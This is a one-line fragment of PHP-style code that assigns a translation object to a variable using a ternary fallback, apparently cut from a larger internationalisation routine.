     $tr = $i18n ? $i18n : $tr;
